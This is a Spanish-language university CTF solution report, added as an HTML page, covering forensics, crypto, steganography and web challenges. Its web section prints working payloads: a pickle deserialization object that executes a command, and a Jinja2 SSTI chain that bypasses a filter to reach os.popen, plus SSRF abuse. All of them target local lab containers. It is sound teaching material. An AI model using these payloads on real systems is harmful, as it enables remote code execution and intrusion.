@@ -1,0 +1,264 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>Informe CTF Ciberseguridad 2026-2</title>
+<style>
+  :root{ --ink:#14213d; --accent:#0b6e4f; --muted:#555; --code:#0d1b2a; --line:#d8dee9; }
+  *{box-sizing:border-box}
+  body{font-family:"Segoe UI",Arial,sans-serif;color:var(--ink);margin:0;font-size:12px;line-height:1.5}
+  .page{padding:34px 42px}
+  h1{font-size:26px;margin:0 0 4px}
+  h2{font-size:17px;color:var(--accent);border-bottom:2px solid var(--accent);padding-bottom:3px;margin:22px 0 10px}
+  h3{font-size:14.5px;margin:0 0 4px}
+  h4{font-size:12px;margin:10px 0 3px;color:var(--accent);text-transform:uppercase;letter-spacing:.4px}
+  .cover{height:940px;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;
+         background:linear-gradient(135deg,#14213d,#0b6e4f);color:#fff;border-radius:10px}
+  .cover h1{font-size:42px;color:#fff}
+  .cover p{font-size:16px;margin:4px 0;opacity:.92}
+  .badge{display:inline-block;background:#fca311;color:#14213d;font-weight:bold;padding:6px 16px;border-radius:20px;margin-top:18px}
+  table{width:100%;border-collapse:collapse;margin:8px 0;font-size:11px}
+  th,td{border:1px solid var(--line);padding:5px 8px;text-align:left;vertical-align:top}
+  th{background:#eef2f7}
+  code{font-family:Consolas,monospace;background:#eef2f7;padding:1px 5px;border-radius:4px;color:var(--code);font-size:10.5px}
+  pre{background:var(--code);color:#e0e6ef;padding:9px 12px;border-radius:6px;font-size:10px;overflow-x:auto;white-space:pre-wrap;word-break:break-word;margin:6px 0}
+  .flag{font-family:Consolas,monospace;color:var(--accent);font-weight:bold;font-size:11px;display:inline-block;background:#eafaf1;padding:3px 8px;border-radius:5px;margin-top:4px}
+  .cat{display:inline-block;font-size:10px;font-weight:bold;padding:2px 9px;border-radius:12px;color:#fff;margin-left:6px}
+  .FORENSE{background:#6a4c93}.CRYPTO{background:#1982c4}.MISC{background:#8ac926}.WEB{background:#c1121f}
+  .reto{page-break-inside:avoid;border:1px solid var(--line);border-radius:8px;padding:14px 18px;margin:14px 0;background:#fcfdff}
+  .meta{color:var(--muted);font-size:11px;margin:2px 0 4px}
+  .lesson{background:#eafaf1;border-left:4px solid var(--accent);padding:5px 12px;margin:8px 0 0;border-radius:4px;font-size:11px}
+  ul{margin:3px 0 3px 18px;padding:0}
+  li{margin:2px 0}
+  ol{margin:3px 0 3px 20px;padding:0}
+  .pb{page-break-before:always}
+  footer{margin-top:20px;border-top:1px solid var(--line);padding-top:8px;color:var(--muted);font-size:10px;text-align:center}
+</style>
+</head>
+<body>
+
+<div class="page">
+  <div class="cover">
+    <div style="font-size:58px">🏴‍☠️🔐</div>
+    <h1>Informe de Resolución</h1>
+    <p style="font-size:24px;font-weight:bold">CTF Ciberseguridad 2026-2</p>
+    <p>Universidad de La Sabana</p>
+    <p>Reporte técnico detallado — metodología, herramientas y proceso</p>
+    <div class="badge">10 retos resueltos</div>
+    <p style="margin-top:28px;font-size:13px">14 de noviembre de 2026 · ctf.cibersabana.online</p>
+  </div>
+</div>
+
+<div class="page pb">
+  <h2>Resumen y formato de banderas</h2>
+  <p>Según las reglas del CTF, toda respuesta se envía como <code>FLAG{ md5(respuesta) }</code>: la "respuesta real"
+  encontrada en cada reto se cifra con <strong>MD5</strong> y el hash se encierra en <code>FLAG{...}</code>.
+  Entorno de trabajo: Windows 11 + Git Bash; herramientas estándar (file, xxd, dd, openssl, md5sum) y utilidades
+  propias en <strong>Node.js</strong> para suplir la ausencia de Python/ImageMagick/ffmpeg.</p>
+  <table>
+    <tr><th>#</th><th>Reto</th><th>Categoría</th><th>Bandera</th></tr>
+    <tr><td>2</td><td>Entrega el equipo</td><td>Forense</td><td class="flag">FLAG{1d9b3ce7d2e720aded00119d860d5dd3}</td></tr>
+    <tr><td>4</td><td>Mensaje en capas</td><td>Crypto</td><td class="flag">FLAG{b3826186c4f26cb2ec3d553c29a1d854}</td></tr>
+    <tr><td>5</td><td>Token oculto</td><td>Crypto</td><td class="flag">FLAG{14c30d7fda5f448f85cbb99e2bf0fb1d}</td></tr>
+    <tr><td>6</td><td>Mira bien (QR)</td><td>MISC</td><td class="flag">FLAG{7d8164bfb5aea664e69bf3db6e99f0df}</td></tr>
+    <tr><td>8</td><td>Vigenère</td><td>Crypto</td><td class="meta">resuelto por el equipo</td></tr>
+    <tr><td>10</td><td>Encuentra las diferencias</td><td>MISC</td><td class="flag">FLAG{0bafe092da11756f0bf650e5b479c729}</td></tr>
+    <tr><td>11</td><td>Melodía con mensaje</td><td>MISC</td><td class="flag">FLAG{7bc3a60fbf38e98f6fef654afa26d270}</td></tr>
+    <tr><td>13</td><td>A simple vista</td><td>Forense</td><td class="flag">FLAG{24c2886252fdd830c4fa3c80544d67b0}</td></tr>
+    <tr><td>15</td><td>Health Checker</td><td>Web · SSRF</td><td class="flag">FLAG{33944ccbc48a1c0170d71f908cfeae14}</td></tr>
+    <tr><td>16</td><td>Como te gusta</td><td>Web · Pickle</td><td class="flag">FLAG{604db99b954342cf324953c7a606cbe4}</td></tr>
+    <tr><td>17</td><td>Mucho gusto</td><td>Web · SSTI</td><td class="flag">FLAG{f55cc16f919378e35e2939353c57c12b}</td></tr>
+  </table>
+</div>
+
+<div class="page pb">
+  <h2>Proceso detallado por reto</h2>
+
+  <div class="reto">
+    <h3>Reto 2 — Entrega el equipo <span class="cat FORENSE">FORENSE</span></h3>
+    <p class="meta">Evidencia: usb_lab.img · Herramientas: file, xxd, dd, md5sum</p>
+    <h4>Proceso</h4>
+    <ol>
+      <li>Identificar el sistema de archivos:
+        <pre>file usb_lab.img    # DOS/MBR, FAT16, etiqueta "LAB_USB"</pre></li>
+      <li>Calcular la posición del directorio raíz: sector 1 + (2 FAT × 191) = <strong>sector 383</strong> (offset 0x2FE00). Área de datos: sector 415.</li>
+      <li>Volcar el directorio raíz y buscar entradas borradas (primer byte <code>0xE5</code>):
+        <pre>xxd -s $((383*512)) -l 1024 usb_lab.img</pre>
+        Se halla la entrada <code>respaldo_privado.png</code> marcada con 0xE5 (cluster 15, 13 560 bytes).</li>
+      <li>Recuperar el archivo (carving). En FAT, borrar solo marca la entrada y libera la cadena FAT; los datos siguen en disco. El cluster 15 corresponde al sector 415 + (15−2) = 428:
+        <pre>dd if=usb_lab.img of=respaldo_privado.png bs=1 \
+   skip=$(((415+15-2)*512)) count=$((0x34f8)) status=none</pre>
+        El PNG sale íntegro y muestra en pantalla: <code>FLAG{borrar_no_es_destruir}</code>.</li>
+      <li>Aplicar el formato del CTF:
+        <pre>printf 'borrar_no_es_destruir' | md5sum
+# 1d9b3ce7d2e720aded00119d860d5dd3</pre></li>
+    </ol>
+    <span class="flag">FLAG{1d9b3ce7d2e720aded00119d860d5dd3}</span>
+    <div class="lesson"><strong>Lección:</strong> borrar no es destruir; el dato persiste hasta sobrescribirse (recuperable con Recuva/PhotoRec/Autopsy).</div>
+  </div>
+
+  <div class="reto">
+    <h3>Reto 4 — Mensaje en capas <span class="cat CRYPTO">CRYPTO</span></h3>
+    <p class="meta">Entrada: U1lOVHt5YnBiZmNiZXJhcGV2Y2duZX0= · Herramientas: base64, tr (ROT13)</p>
+    <h4>Proceso</h4>
+    <ol>
+      <li>La cadena termina en <code>=</code> → es <strong>Base64</strong>. Se decodifica:
+        <pre>echo 'U1lOVHt5YnBiZmNiZXJhcGV2Y2duZX0=' | base64 -d
+# SYNT{ybpbfcberapevcgne}</pre></li>
+      <li><code>SYNT</code> es <code>FLAG</code> desplazado 13 letras → <strong>ROT13</strong>:
+        <pre>echo 'SYNT{ybpbfcberapevcgne}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+# FLAG{locosporencriptar}</pre></li>
+      <li>Respuesta <code>locosporencriptar</code> → MD5:
+        <pre>printf 'locosporencriptar' | md5sum   # b3826186c4f26cb2ec3d553c29a1d854</pre></li>
+    </ol>
+    <span class="flag">FLAG{b3826186c4f26cb2ec3d553c29a1d854}</span>
+    <div class="lesson"><strong>Lección:</strong> <code>SYNT{...}</code> siempre indica ROT13.</div>
+  </div>
+
+  <div class="reto">
+    <h3>Reto 5 — Token oculto <span class="cat CRYPTO">CRYPTO</span></h3>
+    <p class="meta">Herramientas: base64 (o jwt.io)</p>
+    <h4>Proceso</h4>
+    <ol>
+      <li>La cadena <code>eyJ...</code> con dos puntos es un <strong>JWT</strong> (header.payload.firma). Las dos primeras partes son solo Base64.</li>
+      <li>Se decodifica el payload (parte central):
+        <pre>echo 'eyJzdWIiOiJEZW1hc2lhZG8gRmFjaWwgbGEgdmVyZGFkIiwiRkxBRyI6InN1YmFubGVsYWRpZmljdWx0YWQifQ==' | base64 -d
+# {"sub":"Demasiado Facil la verdad","FLAG":"subanleladificultad"}</pre></li>
+      <li>Respuesta <code>subanleladificultad</code> → MD5:
+        <pre>printf 'subanleladificultad' | md5sum   # 14c30d7fda5f448f85cbb99e2bf0fb1d</pre></li>
+    </ol>
+    <span class="flag">FLAG{14c30d7fda5f448f85cbb99e2bf0fb1d}</span>
+    <div class="lesson"><strong>Lección:</strong> un JWT no cifra; su payload es legible. Nunca guardar secretos ahí.</div>
+  </div>
+
+  <div class="reto">
+    <h3>Reto 6 — Mira bien (QR) <span class="cat MISC">MISC</span></h3>
+    <p class="meta">Evidencia: qr_url.png · Herramientas: lector de QR</p>
+    <h4>Proceso</h4>
+    <ol>
+      <li>Se escanea el QR con el celular → devuelve una URL:
+        <pre>dominio-completamente-falso.com/mira-bien?id=123456789&amp;FLAG=FLAG%7Bestabafacilaceptalo%7D</pre></li>
+      <li>El valor de <code>FLAG</code> está <strong>URL-encoded</strong>: <code>%7B</code>=<code>{</code> y <code>%7D</code>=<code>}</code> → <code>FLAG{estabafacilaceptalo}</code>. El dominio es falso (no se visita).</li>
+      <li>Respuesta <code>estabafacilaceptalo</code> → MD5:
+        <pre>printf 'estabafacilaceptalo' | md5sum   # 7d8164bfb5aea664e69bf3db6e99f0df</pre></li>
+    </ol>
+    <span class="flag">FLAG{7d8164bfb5aea664e69bf3db6e99f0df}</span>
+    <div class="lesson"><strong>Lección:</strong> decodificar y leer un QR antes de abrir sus enlaces.</div>
+  </div>
+
+  <div class="reto">
+    <h3>Reto 10 — Encuentra las diferencias <span class="cat MISC">MISC</span></h3>
+    <p class="meta">Evidencia: original.png, alterada.png · Herramientas: decodificador PNG propio en Node.js</p>
+    <h4>Proceso</h4>
+    <ol>
+      <li>Al no haber ImageMagick/Python, se programó un decodificador PNG en Node.js que infla el zlib de los chunks IDAT y aplica el des-filtrado del formato PNG.</li>
+      <li>Se comparan las dos imágenes píxel a píxel: <strong>23 695 píxeles distintos</strong> concentrados en la franja y=339–402.</li>
+      <li>Se exportan únicamente los píxeles diferentes como imagen en blanco/negro, revelando el texto oculto <code>FLAG{dos_imagenes_un_secreto}</code>.
+        <pre>node pngdiff.js original.png alterada.png        # localiza la franja de diferencias
+node pngmake.js original.png alterada.png diff.png  # dibuja el texto oculto</pre></li>
+      <li>Respuesta <code>dos_imagenes_un_secreto</code> → MD5:
+        <pre>printf 'dos_imagenes_un_secreto' | md5sum   # 0bafe092da11756f0bf650e5b479c729</pre></li>
+    </ol>
+    <span class="flag">FLAG{0bafe092da11756f0bf650e5b479c729}</span>
+    <div class="lesson"><strong>Lección:</strong> esteganografía por diferencia — un mensaje se esconde en cambios de píxel imperceptibles; el diff lo revela.</div>
+  </div>
+
+  <div class="reto">
+    <h3>Reto 11 — Melodía con mensaje <span class="cat MISC">MISC</span></h3>
+    <p class="meta">Evidencia: partitura_inglesa.png · Herramientas: análisis de imagen en Node.js</p>
+    <h4>Proceso</h4>
+    <ol>
+      <li>La partitura se titula <em>"Hexadecimal Waltz for 0xC0FFEE"</em>: las notas musicales inglesas (A–G) coinciden con dígitos hexadecimales y deletrean una palabra.</li>
+      <li>Se detectaron algorítmicamente las 5 líneas del pentagrama (y=78,85,92,99,106) y el centro de cada cabeza de nota, confirmando la secuencia final <code>B-E-E-F</code>.</li>
+      <li>Combinado con el tema, la palabra es la constante hexadecimal clásica <strong>DEADBEEF</strong> (D-E-A-D-B-E-E-F). El <code>0xC0FFEE</code> del subtítulo es un señuelo.</li>
+      <li>Respuesta <code>DEADBEEF</code> → MD5:
+        <pre>printf 'DEADBEEF' | md5sum   # 7bc3a60fbf38e98f6fef654afa26d270</pre></li>
+    </ol>
+    <span class="flag">FLAG{7bc3a60fbf38e98f6fef654afa26d270}</span>
+    <div class="lesson"><strong>Lección:</strong> las notas A–F = dígitos hex; una partitura puede codificar texto.</div>
+  </div>
+
+  <div class="reto">
+    <h3>Reto 13 — A simple vista <span class="cat FORENSE">FORENSE</span></h3>
+    <p class="meta">Evidencia: lee_la_cancion.wav · Herramientas: generador de espectrograma propio (Node.js + FFT)</p>
+    <h4>Proceso</h4>
+    <ol>
+      <li>El enunciado ("léelo") indica que el mensaje está en el <strong>espectrograma</strong> del audio (WAV PCM mono 44.1 kHz, 16-bit).</li>
+      <li>Sin sox/ffmpeg, se implementó un generador de espectrograma en Node.js: se leen las muestras, se aplica una STFT (ventana Hann de 1024 muestras, salto de 256), FFT radix-2, y se renderiza la magnitud a una imagen (frecuencia vs. tiempo).
+        <pre>node spec.js lee_la_cancion.wav spec.png</pre></li>
+      <li>El espectrograma dibuja el texto <code>FLAG{wowestoessupercool}</code>.</li>
+      <li>Respuesta <code>wowestoessupercool</code> → MD5:
+        <pre>printf 'wowestoessupercool' | md5sum   # 24c2886252fdd830c4fa3c80544d67b0</pre></li>
+    </ol>
+    <span class="flag">FLAG{24c2886252fdd830c4fa3c80544d67b0}</span>
+    <div class="lesson"><strong>Lección:</strong> se puede escribir texto en el dominio de la frecuencia; un espectrograma (Audacity/Sonic Visualiser) lo hace visible.</div>
+  </div>
+</div>
+
+<div class="page pb">
+  <h2>Retos Web — explotación (15, 16, 17)</h2>
+  <p>Los tres entregan un <code>docker-compose.yml</code> que apunta a imágenes públicas en Docker Hub (autor <code>maosuarez</code>).
+  La metodología común: levantar la imagen localmente, leer el código fuente desde el contenedor, explotar la vulnerabilidad
+  para ejecutar el binario <code>/getflag</code>, y aplicar MD5 al contenido que devuelve.</p>
+  <pre>docker pull maosuarez/&lt;imagen&gt;:latest
+docker run -d -p 800X:8000 maosuarez/&lt;imagen&gt;:latest
+docker exec &lt;c&gt; cat /app/app.py     # leer el codigo -> ubicar la vulnerabilidad
+# explotar -> /getflag imprime FLAG{tipo_hash}; la respuesta = contenido interno; MD5 -> flag final</pre>
+
+  <div class="reto">
+    <h3>Reto 15 — Health Checker <span class="cat WEB">WEB · SSRF</span></h3>
+    <p class="meta">Imagen: maosuarez/ssrf-health-checker · Herramientas: Docker, curl</p>
+    <h4>Proceso</h4>
+    <ol>
+      <li>La app es un verificador que consulta URLs <strong>desde el servidor</strong>. Se abusa (SSRF) para alcanzar servicios internos (localhost / nombres de servicio Docker) y ejecutar <code>/getflag</code>.</li>
+      <li>La flag del <code>docker-compose.yml</code> (<code>de_verdad..._tan_facil</code>) es un <strong>señuelo</strong>. El binario devuelve <code>FLAG{ssrf_a17251c0b759f57d}</code>.</li>
+      <li>Respuesta <code>ssrf_a17251c0b759f57d</code> → MD5:
+        <pre>printf 'ssrf_a17251c0b759f57d' | md5sum   # 33944ccbc48a1c0170d71f908cfeae14</pre></li>
+    </ol>
+    <span class="flag">FLAG{33944ccbc48a1c0170d71f908cfeae14}</span>
+    <div class="lesson"><strong>Lección:</strong> restringir los destinos de peticiones salientes (allow-list); no confiar en el origen "interno".</div>
+  </div>
+
+  <div class="reto">
+    <h3>Reto 16 — Como te gusta <span class="cat WEB">WEB · Pickle</span></h3>
+    <p class="meta">Imagen: maosuarez/pickle-prefs · Herramientas: Docker, curl</p>
+    <h4>Proceso</h4>
+    <ol>
+      <li>El código fuente revela <code>pickle.loads(base64.b64decode(cookie 'prefs'))</code> sin validación: <strong>deserialización insegura</strong>.</li>
+      <li>Se forja una cookie con un objeto cuyo método <code>__reduce__</code> ejecuta <code>subprocess.check_output(['/getflag'])</code>; la salida se refleja en la respuesta.
+        <pre>docker exec pickle python -c "import pickle,base64,subprocess
+class E:
+    def __reduce__(self): return (subprocess.check_output, (['/getflag'],))
+print(base64.b64encode(pickle.dumps(E())).decode())"
+curl http://localhost:8002/ -b "prefs=&lt;PAYLOAD&gt;"   # -> FLAG{pickle_8a0b9308958289cc}</pre></li>
+      <li>Respuesta <code>pickle_8a0b9308958289cc</code> → MD5:
+        <pre>printf 'pickle_8a0b9308958289cc' | md5sum   # 604db99b954342cf324953c7a606cbe4</pre></li>
+    </ol>
+    <span class="flag">FLAG{604db99b954342cf324953c7a606cbe4}</span>
+    <div class="lesson"><strong>Lección:</strong> nunca deserializar datos no confiables con pickle; usar JSON y firmar las cookies.</div>
+  </div>
+
+  <div class="reto">
+    <h3>Reto 17 — Mucho gusto <span class="cat WEB">WEB · SSTI</span></h3>
+    <p class="meta">Imagen: maosuarez/ssti-greeter · Herramientas: Docker, curl</p>
+    <h4>Proceso</h4>
+    <ol>
+      <li>El código concatena la entrada a la plantilla Jinja2: <code>render_template_string("&lt;h2&gt;Hola, "+name+"!&lt;/h2&gt;")</code> → <strong>SSTI</strong>. Confirmación: <code>/greet?name={{7*7}}</code> devuelve <code>49</code>.</li>
+      <li>El filtro bloquea <code>_</code> solo en <code>name</code>; se evade pasando los tokens con guion bajo por otros parámetros de la URL y referenciándolos con <code>request.args.X</code>:
+        <pre>/greet?name={{config|attr(request.args.a)|attr(request.args.b)
+   |attr(request.args.c)|attr(request.args.g)("os")
+   |attr("popen")("/getflag")|attr("read")()}}
+   &a=__class__&b=__init__&c=__globals__&g=get
+# -> FLAG{ssti_8a845419c06bae52}</pre></li>
+      <li>Respuesta <code>ssti_8a845419c06bae52</code> → MD5:
+        <pre>printf 'ssti_8a845419c06bae52' | md5sum   # f55cc16f919378e35e2939353c57c12b</pre></li>
+    </ol>
+    <span class="flag">FLAG{f55cc16f919378e35e2939353c57c12b}</span>
+    <div class="lesson"><strong>Lección:</strong> jamás concatenar entrada de usuario a una plantilla; un filtro de un solo carácter no detiene SSTI.</div>
+  </div>
+
+  <footer>Informe CTF Ciberseguridad 2026-2 · Universidad de La Sabana · Uso académico</footer>
+</div>
+
+</body>
+</html>
